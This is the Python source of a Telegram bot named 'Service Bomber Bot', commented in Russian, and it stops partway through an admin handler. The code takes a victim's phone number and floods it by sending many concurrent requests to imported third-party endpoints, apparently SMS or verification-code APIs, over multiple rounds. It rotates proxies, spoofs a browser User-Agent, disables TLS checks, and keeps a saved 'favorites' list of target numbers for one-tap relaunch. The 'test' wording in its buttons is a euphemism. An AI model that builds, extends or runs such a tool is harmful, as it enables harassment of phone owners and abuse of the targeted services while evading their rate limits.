"""
Service Bomber Bot — aiogram 3 monolith for bothost.ru.

Изменения относительно предыдущей версии:
  1. Таблица favorites: у каждого пользователя своя записная книжка
     номеров с метками.
  2. on_plain_text авто-распознаёт номер, нормализует и сразу предлагает
     [🚀 Запустить тест] и [⭐ Добавить в Избранное].
  3. /favorites — вертикальное inline-меню. Клик по номеру → мгновенный
     запуск Runner. FSM для добавления новых. Удаление по кнопке.
  4. Гибкий импорт: админы могут слать прокси и сервисы как файлом,
     так и вставкой текста в чат.
  5. Все inline-кнопки запуска (run_current, fav_run:*, fav_add) проходят
     через check_subscription().

Env:
    BOT_TOKEN       required
    ADMIN_IDS       required, пробел или запятая
    DB_PATH         optional, default ./bomber.sqlite3
    SERVICES_FILE   optional, default ./external_services.json
"""

from __future__ import annotations

import asyncio
import html
import io
import json
import logging
import os
import random
import re
import signal
import sqlite3
import sys
import threading
import time
from contextlib import contextmanager
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Awaitable, Callable, Iterator
from urllib.parse import quote, urlparse

import httpx
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)


# ============================================================ config

def _env_admins() -> frozenset[int]:
    raw = os.environ.get("ADMIN_IDS", "").strip()
    return frozenset(
        int(x) for x in raw.replace(",", " ").split()
        if x.strip().lstrip("-").isdigit()
    )


BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ADMIN_IDS = _env_admins()
DB_PATH = Path(os.environ.get("DB_PATH", "bomber.sqlite3")).resolve()
SERVICES_FILE = Path(os.environ.get("SERVICES_FILE", "external_services.json")).resolve()

DEFAULT_TIMEOUT = 12.0
PER_HOST_CONCURRENCY = 6
MAX_RETRIES = 1
DEFAULT_CONCURRENCY = 40
DEFAULT_ROUNDS = 1

FAV_MAX = 40  # сколько избранных разрешаем на пользователя


# ============================================================ storage

SCHEMA = """
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    raw TEXT NOT NULL UNIQUE,
    url TEXT NOT NULL,
    alive INTEGER NOT NULL DEFAULT 1,
    fails INTEGER NOT NULL DEFAULT 0,
    last_used REAL NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS services (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    spec TEXT NOT NULL,
    source TEXT NOT NULL DEFAULT 'default',
    UNIQUE(name, spec)
);
CREATE TABLE IF NOT EXISTS meta (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS favorites (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    phone TEXT NOT NULL,
    label TEXT NOT NULL,
    UNIQUE(user_id, phone)
);
CREATE INDEX IF NOT EXISTS idx_favorites_user ON favorites(user_id);
"""


@dataclass
class ProxyRow:
    id: int
    raw: str
    url: str
    alive: bool
    fails: int


@dataclass
class FavoriteRow:
    id: int
    user_id: int
    phone: str
    label: str


class Storage:
    def __init__(self, path: Path) -> None:
        self._path = path
        self._lock = threading.Lock()
        with self._conn() as conn:
            conn.executescript(SCHEMA)
            conn.execute("INSERT OR IGNORE INTO meta(key,value) VALUES('op_status','0')")
            conn.execute("INSERT OR IGNORE INTO meta(key,value) VALUES('op_channel_id','')")
            conn.execute("INSERT OR IGNORE INTO meta(key,value) VALUES('op_channel_url','')")

    @contextmanager
    def _conn(self) -> Iterator[sqlite3.Connection]:
        conn = sqlite3.connect(self._path, isolation_level=None, timeout=15)
        conn.row_factory = sqlite3.Row
        try:
            conn.execute("PRAGMA journal_mode=WAL")
            yield conn
        finally:
            conn.close()

    # proxies --------------------------------------------------------

    def add_proxies(self, entries: list[tuple[str, str]]) -> int:
        added = 0
        with self._lock, self._conn() as conn:
            for raw, url in entries:
                try:
                    conn.execute("INSERT INTO proxies(raw,url) VALUES(?,?)", (raw, url))
                    added += 1
                except sqlite3.IntegrityError:
                    continue
        return added

    def count_proxies(self, alive_only: bool = True) -> int:
        sql = "SELECT COUNT(*) AS n FROM proxies"
        if alive_only:
            sql += " WHERE alive=1"
        with self._conn() as conn:
            return int(conn.execute(sql).fetchone()["n"])

    def sample_proxies(self, limit: int = 8) -> list[ProxyRow]:
        with self._conn() as conn:
            rows = conn.execute(
                "SELECT id,raw,url,alive,fails FROM proxies "
                "ORDER BY last_used ASC LIMIT ?", (limit,)
            ).fetchall()
        return [ProxyRow(r["id"], r["raw"], r["url"], bool(r["alive"]), r["fails"]) for r in rows]

    def all_alive_proxies(self) -> list[ProxyRow]:
        with self._conn() as conn:
            rows = conn.execute(
                "SELECT id,raw,url,alive,fails FROM proxies WHERE alive=1"
            ).fetchall()
        return [ProxyRow(r["id"], r["raw"], r["url"], bool(r["alive"]), r["fails"]) for r in rows]

    def mark_proxy(self, proxy_id: int, ok: bool) -> None:
        with self._lock, self._conn() as conn:
            if ok:
                conn.execute(
                    "UPDATE proxies SET last_used=?, fails=0 WHERE id=?",
                    (time.time(), proxy_id),
                )
            else:
                conn.execute(
                    "UPDATE proxies SET fails=fails+1, last_used=? WHERE id=?",
                    (time.time(), proxy_id),
                )
                conn.execute(
                    "UPDATE proxies SET alive=0 WHERE id=? AND fails>=5",
                    (proxy_id,),
                )

    def clear_proxies(self) -> None:
        with self._lock, self._conn() as conn:
            conn.execute("DELETE FROM proxies")

    # services -------------------------------------------------------

    def add_services(self, specs: list[dict[str, Any]], source: str) -> int:
        added = 0
        with self._lock, self._conn() as conn:
            for spec in specs:
                name = str(spec.get("name") or "").strip()
                if not name or "url" not in spec:
                    continue
                blob = json.dumps(spec, ensure_ascii=False, sort_keys=True)
                try:
                    conn.execute(
                        "INSERT INTO services(name,spec,source) VALUES(?,?,?)",
                        (name, blob, source),
                    )
                    added += 1
                except sqlite3.IntegrityError:
                    continue
        return added

    def list_services(self) -> list[dict[str, Any]]:
        with self._conn() as conn:
            rows = conn.execute(
                "SELECT id,name,spec,source FROM services ORDER BY name"
            ).fetchall()
        out = []
        for r in rows:
            spec = json.loads(r["spec"])
            spec["_id"] = r["id"]
            spec["_source"] = r["source"]
            out.append(spec)
        return out

    def count_services(self) -> int:
        with self._conn() as conn:
            return int(conn.execute("SELECT COUNT(*) AS n FROM services").fetchone()["n"])

    def clear_services(self) -> None:
        with self._lock, self._conn() as conn:
            conn.execute("DELETE FROM services")

    # meta -----------------------------------------------------------

    def get_meta(self, key: str, default: str | None = None) -> str | None:
        with self._conn() as conn:
            row = conn.execute("SELECT value FROM meta WHERE key=?", (key,)).fetchone()
        return row["value"] if row else default

    def set_meta(self, key: str, value: str) -> None:
        with self._lock, self._conn() as conn:
            conn.execute(
                "INSERT INTO meta(key,value) VALUES(?,?) "
                "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
                (key, value),
            )

    # per-user target ------------------------------------------------

    def get_user_target(self, user_id: int) -> str | None:
        return self.get_meta(f"target_phone:{user_id}")

    def set_user_target(self, user_id: int, value: str) -> None:
        self.set_meta(f"target_phone:{user_id}", value)

    def count_user_targets(self) -> int:
        with self._conn() as conn:
            return int(conn.execute(
                "SELECT COUNT(*) AS n FROM meta WHERE key LIKE 'target_phone:%'"
            ).fetchone()["n"])

    # favorites ------------------------------------------------------

    def fav_add(self, user_id: int, phone: str, label: str) -> int | None:
        """
        Возвращает id новой записи, или None если такая пара (user,phone)
        уже есть, либо достигнут лимит FAV_MAX.
        """
        with self._lock, self._conn() as conn:
            n = int(conn.execute(
                "SELECT COUNT(*) AS n FROM favorites WHERE user_id=?", (user_id,)
            ).fetchone()["n"])
            if n >= FAV_MAX:
                return None
            try:
                cur = conn.execute(
                    "INSERT INTO favorites(user_id,phone,label) VALUES(?,?,?)",
                    (user_id, phone, label),
                )
                return int(cur.lastrowid)
            except sqlite3.IntegrityError:
                return None

    def fav_list(self, user_id: int) -> list[FavoriteRow]:
        with self._conn() as conn:
            rows = conn.execute(
                "SELECT id,user_id,phone,label FROM favorites "
                "WHERE user_id=? ORDER BY id DESC",
                (user_id,),
            ).fetchall()
        return [FavoriteRow(r["id"], r["user_id"], r["phone"], r["label"]) for r in rows]

    def fav_get(self, fav_id: int, user_id: int) -> FavoriteRow | None:
        """Возвращает только если запись принадлежит этому user_id — защита от
        дергания чужих callback_data."""
        with self._conn() as conn:
            row = conn.execute(
                "SELECT id,user_id,phone,label FROM favorites WHERE id=? AND user_id=?",
                (fav_id, user_id),
            ).fetchone()
        if not row:
            return None
        return FavoriteRow(row["id"], row["user_id"], row["phone"], row["label"])

    def fav_delete(self, fav_id: int, user_id: int) -> bool:
        with self._lock, self._conn() as conn:
            cur = conn.execute(
                "DELETE FROM favorites WHERE id=? AND user_id=?",
                (fav_id, user_id),
            )
            return cur.rowcount > 0

    def fav_count(self, user_id: int) -> int:
        with self._conn() as conn:
            return int(conn.execute(
                "SELECT COUNT(*) AS n FROM favorites WHERE user_id=?", (user_id,)
            ).fetchone()["n"])

    # ОП -------------------------------------------------------------

    def op_enabled(self) -> bool:
        return (self.get_meta("op_status", "0") or "0") == "1"

    def op_toggle(self) -> bool:
        new = "0" if self.op_enabled() else "1"
        self.set_meta("op_status", new)
        return new == "1"

    def op_channel_id(self) -> str:
        return (self.get_meta("op_channel_id", "") or "").strip()

    def op_channel_url(self) -> str:
        return (self.get_meta("op_channel_url", "") or "").strip()


# ============================================================ proxy parsing

_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def _valid_host(host: str) -> bool:
    if _IPV4_RE.match(host):
        return all(0 <= int(p) <= 255 for p in host.split("."))
    return bool(host) and re.match(r"^[A-Za-z0-9.\-]+$", host) is not None


def parse_proxy_line(line: str, default_scheme: str = "http") -> tuple[str, str] | None:
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None

    if "://" in raw:
        p = urlparse(raw)
        if not p.hostname or not p.port or not _valid_host(p.hostname):
            return None
        return raw, raw

    if "@" in raw:
        creds, hostport = raw.rsplit("@", 1)
        if ":" not in hostport:
            return None
        host, port = hostport.rsplit(":", 1)
        if not _valid_host(host) or not port.isdigit():
            return None
        user, _, pwd = creds.partition(":")
        url = (
            f"{default_scheme}://{quote(user, safe='')}:{quote(pwd, safe='')}"
            f"@{host}:{port}"
        )
        return raw, url

    parts = raw.split(":")
    if len(parts) == 4 and _valid_host(parts[0]) and parts[1].isdigit():
        host, port, user, pwd = parts
        url = (
            f"{default_scheme}://{quote(user, safe='')}:{quote(pwd, safe='')}"
            f"@{host}:{port}"
        )
        return raw, url

    if len(parts) == 2 and _valid_host(parts[0]) and parts[1].isdigit():
        host, port = parts
        return raw, f"{default_scheme}://{host}:{port}"

    return None


def parse_proxy_blob(blob: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    seen: set[str] = set()
    for line in blob.splitlines():
        parsed = parse_proxy_line(line)
        if not parsed:
            continue
        raw, url = parsed
        key = url.lower()
        if key in seen:
            continue
        seen.add(key)
        out.append((raw, url))
    return out


# ============================================================ services import

PLACEHOLDER_FULL = "{full_phone}"
PLACEHOLDER_BARE = "{phone}"

_DEFAULT_UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
)


def normalize_spec(entry: dict[str, Any], source: str = "import") -> dict[str, Any] | None:
    if not isinstance(entry, dict):
        return None
    name = str(entry.get("name") or entry.get("service") or "").strip()
    url = str(entry.get("url") or entry.get("endpoint") or "").strip()
    if not name or not url:
        return None

    method = str(entry.get("method") or "POST").upper()
    headers = entry.get("headers") or {}
    if not isinstance(headers, dict):
        headers = {}
    headers.setdefault("User-Agent", _DEFAULT_UA)
    headers.setdefault("Accept", "application/json")
    if method in ("POST", "PUT", "PATCH") and "Content-Type" not in headers:
        headers["Content-Type"] = "application/json"

    payload = entry.get("payload")
    if payload is None and method in ("POST", "PUT", "PATCH"):
        payload = {"phone": PLACEHOLDER_FULL}

    return {
        "name": name,
        "url": url,
        "method": method,
        "headers": headers,
        "payload": payload,
        "source": source,
    }


def parse_services_import(raw: bytes | str) -> list[dict[str, Any]]:
    if isinstance(raw, bytes):
        text = raw.decode("utf-8", errors="replace")
    else:
        text = raw
    try:
        doc = json.loads(text)
    except json.JSONDecodeError:
        return []

    if isinstance(doc, dict):
        for key in ("services", "data", "items", "targets"):
            if key in doc and isinstance(doc[key], list):
                doc = doc[key]
                break
        else:
            doc = [doc]

    if not isinstance(doc, list):
        return []

    out: list[dict[str, Any]] = []
    for entry in doc:
        spec = normalize_spec(entry)
        if spec:
            out.append(spec)
    return out


def load_default_services(path: Path) -> list[dict[str, Any]]:
    try:
        return parse_services_import(path.read_bytes())
    except OSError:
        return []


# ============================================================ subscription gate

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


async def check_subscription(bot: Bot, user_id: int) -> tuple[bool, str | None]:
    """
    (True, None) — доступ разрешён.
    (False, channel_url) — нужно подписаться.
    Админы и режим ОП=0 — пропускаем сразу.
    Ошибка Telegram API — логируем и пропускаем, чтобы бот не висел.
    """
    if is_admin(user_id):
        return True, None

    storage: Storage = _STORAGE  # type: ignore[name-defined]
    if not storage.op_enabled():
        return True, None

    channel_id = storage.op_channel_id()
    channel_url = storage.op_channel_url() or None

    if not channel_id:
        logging.warning("ОП включена, но op_channel_id пуст — пропускаю всех")
        return True, None

    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
    except (TelegramBadRequest, TelegramForbiddenError) as exc:
        logging.error("check_subscription: bot не может проверить канал %s: %s",
                      channel_id, exc)
        return True, None
    except Exception as exc:  # noqa: BLE001
        logging.exception("check_subscription: неожиданная ошибка: %s", exc)
        return True, None

    status = getattr(member, "status", None)
    if status in ("member", "administrator", "creator"):
        return True, None
    return False, channel_url


def subscription_keyboard(channel_url: str | None) -> InlineKeyboardMarkup | None:
    if not channel_url:
        return None
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="📢 Подписаться на канал", url=channel_url)
    ]])


async def deny_unsubscribed(target: Message | CallbackQuery, channel_url: str | None) -> None:
    text = (
        "⚠️ <b>Для использования функций бота необходимо подписаться "
        "на наш официальный канал!</b>"
    )
    kb = subscription_keyboard(channel_url)
    if isinstance(target, CallbackQuery):
        try:
            await target.message.answer(text, reply_markup=kb)
        except Exception:
            pass
        await target.answer("нужна подписка", show_alert=True)
    else:
        await target.answer(text, reply_markup=kb)


# ============================================================ runner

def normalize_phone(raw: str) -> tuple[str, str]:
    digits = re.sub(r"\D", "", raw or "")
    if not digits:
        raise ValueError(f"no digits in phone: {raw!r}")
    if len(digits) == 11 and digits.startswith("8"):
        digits = "7" + digits[1:]
    return f"+{digits}", digits


def mask_phone(raw: str) -> str:
    """+79991234567 -> +7***4567. Мягкая маскировка для UI."""
    full, _ = normalize_phone(raw)
    if len(full) <= 6:
        return full
    return f"{full[:2]}***{full[-4:]}"


def _render(value: Any, full_phone: str, phone: str) -> Any:
    if isinstance(value, str):
        return value.replace(PLACEHOLDER_FULL, full_phone).replace(PLACEHOLDER_BARE, phone)
    if isinstance(value, dict):
        return {k: _render(v, full_phone, phone) for k, v in value.items()}
    if isinstance(value, list):
        return [_render(v, full_phone, phone) for v in value]
    return value


@dataclass
class RunStats:
    sent: int = 0
    ok: int = 0
    fail: int = 0
    started_at: float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.started_at


ProgressFn = Callable[[RunStats], Awaitable[None]]


class Runner:
    def __init__(
        self,
        specs: list[dict[str, Any]],
        proxies: list[ProxyRow],
        storage: Storage,
        concurrency: int = DEFAULT_CONCURRENCY,
    ) -> None:
        self._specs = specs
        self._proxies = proxies
        self._storage = storage
        self._concurrency = concurrency
        self._stop = asyncio.Event()

    def stop(self) -> None:
        self._stop.set()

    async def run(self, raw_phone: str, rounds: int,
                  on_progress: ProgressFn | None = None) -> RunStats:
        full_phone, bare_phone = normalize_phone(raw_phone)
        stats = RunStats()
        lock = asyncio.Lock()
        host_sems: dict[str, asyncio.Semaphore] = {}
        global_sem = asyncio.Semaphore(self._concurrency)
        proxy_pool = list(self._proxies) if self._proxies else [None]

        limits = httpx.Limits(
            max_connections=self._concurrency * 2,
            max_keepalive_connections=self._concurrency,
        )

        async with httpx.AsyncClient(limits=limits, verify=False) as client:
            async def fire(spec: dict[str, Any]) -> None:
                if self._stop.is_set():
                    return
                host = httpx.URL(spec["url"]).host or spec["name"]
                host_sem = host_sems.setdefault(host, asyncio.Semaphore(PER_HOST_CONCURRENCY))

                for attempt in range(MAX_RETRIES + 1):
                    async with global_sem, host_sem:
                        if self._stop.is_set():
                            return
                        proxy = random.choice(proxy_pool)
                        try:
                            kwargs: dict[str, Any] = {
                                "method": spec["method"],
                                "url": _render(spec["url"], full_phone, bare_phone),
                                "headers": spec["headers"],
                                "timeout": DEFAULT_TIMEOUT,
                                "follow_redirects": False,
                            }
                            if spec["method"] in ("POST", "PUT", "PATCH") and spec["payload"] is not None:
                                rendered = _render(spec["payload"], full_phone, bare_phone)
                                ctype = spec["headers"].get("Content-Type", "").lower()
                                if "x-www-form-urlencoded" in ctype:
                                    kwargs["data"] = rendered
                                elif "json" in ctype or not ctype:
                                    kwargs["json"] = rendered
                                else:
                                    kwargs["content"] = json.dumps(rendered)

                            if proxy is not None:
                                kwargs["proxy"] = proxy.url

                            resp = await client.request(**kwargs)
                            ok = 200 <= resp.status_code < 400
                            async with lock:
                                stats.sent += 1
                                if ok:
                                    stats.ok += 1
                                else:
                                    stats.fail += 1
                            if proxy is not None:
                                self._storage.mark_proxy(proxy.id, ok=ok)
                            return
                        except (httpx.TimeoutException, httpx.TransportError):
                            if proxy is not None:
                                self._storage.mark_proxy(proxy.id, ok=False)
                            if attempt == MAX_RETRIES:
                                async with lock:
                                    stats.sent += 1
                                    stats.fail += 1
                                return
                            await asyncio.sleep(0.3 + random.random() * 0.5)
                        except Exception:
                            async with lock:
                                stats.sent += 1
                                stats.fail += 1
                            return

            for r in range(rounds):
                if self._stop.is_set():
                    break
                tasks = [asyncio.create_task(fire(s)) for s in self._specs]
                progress_task = (
                    asyncio.create_task(self._progress_loop(stats, on_progress))
                    if on_progress else None
                )
                await asyncio.gather(*tasks, return_exceptions=True)
                if progress_task:
                    progress_task.cancel()
                    try:
                        await progress_task
                    except (asyncio.CancelledError, Exception):
                        pass
                if on_progress:
                    await on_progress(stats)
                if r < rounds - 1 and not self._stop.is_set():
                    await asyncio.sleep(2.0 + random.random() * 3.0)

        return stats

    async def _progress_loop(self, stats: RunStats, on_progress: ProgressFn) -> None:
        try:
            while True:
                await asyncio.sleep(5.0)
                await on_progress(stats)
        except asyncio.CancelledError:
            return


# ============================================================ FSM

class AdminStates(StatesGroup):
    waiting_channel_id = State()
    waiting_channel_url = State()


class FavStates(StatesGroup):
    waiting_number = State()
    waiting_label = State()


# ============================================================ handlers

router = Router(name="bomber")

RUNNERS: dict[int, Runner] = {}
_STORAGE: Storage | None = None


def fmt_stats(s: RunStats) -> str:
    return f"sent={s.sent} ok={s.ok} fail={s.fail} elapsed={s.elapsed:0.0f}s"


def admin_kb(storage: Storage) -> InlineKeyboardMarkup:
    status = "🟢 ОП включена" if storage.op_enabled() else "🔴 ОП выключена"
    toggle_label = "Выключить ОП" if storage.op_enabled() else "Включить ОП"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{status}  ·  {toggle_label}", callback_data="admin:toggle_op")],
        [InlineKeyboardButton(text="🆔 Настроить ID канала", callback_data="admin:set_channel_id")],
        [InlineKeyboardButton(text="🔗 Настроить ссылку", callback_data="admin:set_channel_url")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin:stats")],
    ])


# ---- общий запуск Runner, используется и /run, и callback'ами -----

async def _launch_run(
    *,
    message: Message,
    storage: Storage,
    phone: str,
    rounds: int = DEFAULT_ROUNDS,
    concurrency: int = DEFAULT_CONCURRENCY,
) -> None:
    """
    Общая точка запуска для /run, run_current и fav_run:*.
    Проверка подписки здесь НЕ дублируется — вызывающий код уже должен был
    её сделать. Здесь — только техническая часть.
    """
    if message.chat.id in RUNNERS:
        await message.answer("already running here. /stop first.")
        return

    services = storage.list_services()
    if not services:
        await message.answer("no services loaded.")
        return

    proxies = storage.all_alive_proxies()
    if not proxies:
        await message.answer("warning: no proxies in pool, running on host IP.")

    specs: list[dict[str, Any]] = []
    for s in services:
        cleaned = {k: v for k, v in s.items() if not k.startswith("_")}
        normalized = normalize_spec(cleaned)
        if normalized:
            specs.append(normalized)

    if not specs:
        await message.answer("services present but none normalized.")
        return

    runner = Runner(specs=specs, proxies=proxies, storage=storage, concurrency=concurrency)
    RUNNERS[message.chat.id] = runner
    storage.set_meta("running", "1")

    last_sent = {"n": -1}

    async def on_progress(stats: RunStats) -> None:
        if stats.sent == last_sent["n"]:
            return
        last_sent["n"] = stats.sent
        try:
            await message.answer(fmt_stats(stats))
        except Exception:
            pass

    await message.answer(
        f"starting for {html.escape(mask_phone(phone))}: services={len(specs)} "
        f"rounds={rounds} concurrency={concurrency} proxies={len(proxies) or 'none'}"
    )

    try:
        stats = await runner.run(phone, rounds=rounds, on_progress=on_progress)
        await message.answer(
            f"finished. sent={stats.sent} ok={stats.ok} fail={stats.fail} "
            f"elapsed={stats.elapsed:0.0f}s"
        )
    except Exception as exc:  # noqa: BLE001
        await message.answer(f"run failed: {type(exc).__name__}: {exc}")
    finally:
        RUNNERS.pop(message.chat.id, None)
        storage.set_meta("running", "0")


# ---- /start --------------------------------------------------------

@router.message(CommandStart())
async def cmd_start(message: Message, storage: Storage) -> None:
    uid = message.from_user.id
    admin_note = "\n/admin — панель администратора" if is_admin(uid) else ""
    await message.answer(
        "bomber bot online.\n\n"
        "/add_phone &lt;number&gt; — задать цель\n"
        "/phone — показать свою цель\n"
        "/favorites — мои сохранённые номера\n"
        "/run [rounds] [concurrency] — запустить\n"
        "/stop — остановить\n"
        "/status — состояние"
        f"{admin_note}\n\n"
        "или просто пришли номер — распознаю сам."
    )


# ---- /add_phone ----------------------------------------------------

@router.message(Command("add_phone"))
async def cmd_add_phone(message: Message, bot: Bot, storage: Storage) -> None:
    uid = message.from_user.id
    ok, url = await check_subscription(bot, uid)
    if not ok:
        await deny_unsubscribed(message, url)
        return

    parts = (message.text or "").split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await message.answer("usage: /add_phone 79991234567")
        return

    phone = parts[1].strip()
    digits = "".join(ch for ch in phone if ch.isdigit())
    if not (10 <= len(digits) <= 15):
        await message.answer("это не похоже на номер. ожидаю 10–15 цифр.")
        return

    full, _ = normalize_phone(phone)
    storage.set_user_target(uid, phone)
    await message.answer(
        f"🎯 Номер успешно распознан и установлен: <b>{html.escape(full)}</b>",
        reply_markup=after_target_kb(),
    )


def after_target_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить тест", callback_data="run_current")],
        [InlineKeyboardButton(text="⭐ Добавить в Избранное", callback_data="fav_add")],
    ])


# ---- /phone --------------------------------------------------------

@router.message(Command("phone"))
async def cmd_phone(message: Message, storage: Storage) -> None:
    uid = message.from_user.id
    cur = storage.get_user_target(uid)
    await message.answer(f"current target: {html.escape(mask_phone(cur)) if cur else '—'}")


# ---- /run ----------------------------------------------------------

@router.message(Command("run"))
async def cmd_run(message: Message, bot: Bot, storage: Storage) -> None:
    uid = message.from_user.id
    ok, url = await check_subscription(bot, uid)
    if not ok:
        await deny_unsubscribed(message, url)
        return

    target = storage.get_user_target(uid)
    if not target:
        await message.answer("set a target first: /add_phone <number>, или просто пришли номер.")
        return

    parts = (message.text or "").split()
    rounds = DEFAULT_ROUNDS
    concurrency = DEFAULT_CONCURRENCY
    if len(parts) >= 2 and parts[1].isdigit():
        rounds = max(1, min(int(parts[1]), 50))
    if len(parts) >= 3 and parts[2].isdigit():
        concurrency = max(1, min(int(parts[2]), 200))

    await _launch_run(
        message=message, storage=storage, phone=target,
        rounds=rounds, concurrency=concurrency,
    )


@router.callback_query(F.data == "run_current")
async def cb_run_current(cb: CallbackQuery, bot: Bot, storage: Storage) -> None:
    uid = cb.from_user.id
    ok, url = await check_subscription(bot, uid)
    if not ok:
        await deny_unsubscribed(cb, url)
        return

    target = storage.get_user_target(uid)
    if not target:
        await cb.answer("цель не задана", show_alert=True)
        return

    await cb.answer("запускаю")
    await _launch_run(message=cb.message, storage=storage, phone=target)


@router.message(Command("stop"))
async def cmd_stop(message: Message) -> None:
    runner = RUNNERS.get(message.chat.id)
    if runner is None:
        await message.answer("nothing running.")
        return
    runner.stop()
    await message.answer("stop signal sent.")


@router.message(Command("status"))
async def cmd_status(message: Message, storage: Storage) -> None:
    uid = message.from_user.id
    target = storage.get_user_target(uid) or "—"
    await message.answer(
        f"target: {html.escape(mask_phone(target)) if target != '—' else '—'}\n"
        f"services: {storage.count_services()}\n"
        f"proxies alive: {storage.count_proxies()}\n"
        f"favorites: {storage.fav_count(uid)}\n"
        f"running: {storage.get_meta('running', '0')}"
    )


# ============================================================ favorites

def favorites_kb(rows: list[FavoriteRow]) -> InlineKeyboardMarkup:
    kb: list[list[InlineKeyboardButton]] = []
    for r in rows:
        kb.append([
            InlineKeyboardButton(
                text=f"{r.label} · {mask_phone(r.phone)}",
                callback_data=f"fav_run:{r.id}",
            ),
            InlineKeyboardButton(text="🗑", callback_data=f"fav_del:{r.id}"),
        ])
    kb.append([InlineKeyboardButton(text="➕ Добавить новый", callback_data="fav_new")])
    return InlineKeyboardMarkup(inline_keyboard=kb)


@router.message(Command("favorites"))
async def cmd_favorites(message: Message, storage: Storage) -> None:
    uid = message.from_user.id
    rows = storage.fav_list(uid)
    if not rows:
        await message.answer(
            "📭 Избранное пусто.\n"
            "Добавь первый номер:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="➕ Добавить новый", callback_data="fav_new")
            ]]),
        )
        return
    await message.answer(
        f"⭐ <b>Избранные номера</b> ({len(rows)})",
        reply_markup=favorites_kb(rows),
    )


@router.callback_query(F.data.startswith("fav_run:"))
async def cb_fav_run(cb: CallbackQuery, bot: Bot, storage: Storage) -> None:
    uid = cb.from_user.id
    fav_id = int(cb.data.split(":", 1)[1])

    ok, url = await check_subscription(bot, uid)
    if not ok:
        await deny_unsubscribed(cb, url)
        return

    row = storage.fav_get(fav_id, uid)
    if row is None:
        await cb.answer("не найдено", show_alert=True)
        return

    await cb.answer(f"запускаю {mask_phone(row.phone)}")
    await _launch_run(message=cb.message, storage=storage, phone=row.phone)


@router.callback_query(F.data.startswith("fav_del:"))
async def cb_fav_del(cb: CallbackQuery, storage: Storage) -> None:
    uid = cb.from_user.id
    fav_id = int(cb.data.split(":", 1)[1])
    deleted = storage.fav_delete(fav_id, uid)
    if not deleted:
        await cb.answer("нечего удалять", show_alert=True)
        return
    await cb.answer("удалено")
    rows = storage.fav_list(uid)
    try:
        if rows:
            await cb.message.edit_reply_markup(reply_markup=favorites_kb(rows))
        else:
            await cb.message.edit_text("📭 Избранное пусто.")
    except Exception:
        pass


@router.callback_query(F.data == "fav_new")
async def cb_fav_new(cb: CallbackQuery, state: FSMContext) -> None:
    uid = cb.from_user.id
    await state.set_state(FavStates.waiting_number)
    await cb.message.answer(
        "➕ Шаг 1/2: пришли номер телефона.\n"
        "Отмена — /favorites."
    )
    await cb.answer()


@router.message(FavStates.waiting_number)
async def fav_input_number(message: Message, state: FSMContext) -> None:
    text = (message.text or "").strip()
    digits = "".join(ch for ch in text if ch.isdigit())
    if not (10 <= len(digits) <= 15):
        await message.answer("не похоже на номер. ожидаю 10–15 цифр.")
        return
    full, _ = normalize_phone(text)
    await state.update_data(fav_phone=text)
    await state.set_state(FavStates.waiting_label)
    await message.answer(
        f"➕ Шаг 2/2: как назвать <b>{html.escape(full)}</b>?\n"
        "пришли короткое имя (до 24 символов)."
    )


@router.message(FavStates.waiting_label)
async def fav_input_label(message: Message, state: FSMContext, storage: Storage) -> None:
    uid = message.from_user.id
    label = (message.text or "").strip()
    if not label or len(label) > 24:
        await message.answer("имя от 1 до 24 символов.")
        return

    data = await state.get_data()
    phone = data.get("fav_phone")
    await state.clear()
    if not phone:
        await message.answer("что-то потерялось, начни заново: /favorites")
        return

    fav_id = storage.fav_add(uid, phone, label)
    if fav_id is None:
        await message.answer(
            "не сохранил: либо такой номер уже в избранном, "
            f"либо достигнут лимит ({FAV_MAX})."
        )
        return

    rows = storage.fav_list(uid)
    await message.answer(
        f"⭐ сохранено: <b>{html.escape(label)}</b> · {html.escape(mask_phone(phone))}",
        reply_markup=favorites_kb(rows),
    )


@router.callback_query(F.data == "fav_add")
async def cb_fav_add_current(cb: CallbackQuery, state: FSMContext, storage: Storage) -> None:
    """
    Кнопка из сообщения после авто-распознавания. Текущая цель уже известна,
    спрашиваем только имя.
    """
    uid = cb.from_user.id
    target = storage.get_user_target(uid)
    if not target:
        await cb.answer("цель не задана", show_alert=True)
        return
    await state.update_data(fav_phone=target)
    await state.set_state(FavStates.waiting_label)
    await cb.message.answer(
        f"как назвать <b>{html.escape(mask_phone(target))}</b>? "
        "пришли короткое имя (до 24 символов)."
    )
    await cb.answer()


# ============================================================ ОП / admin

@router.message(Command("admin"))
async def cmd_admin(message: Message, storage: Storage) -> None:
    uid = message.from_user.id
    if not is_admin(uid):
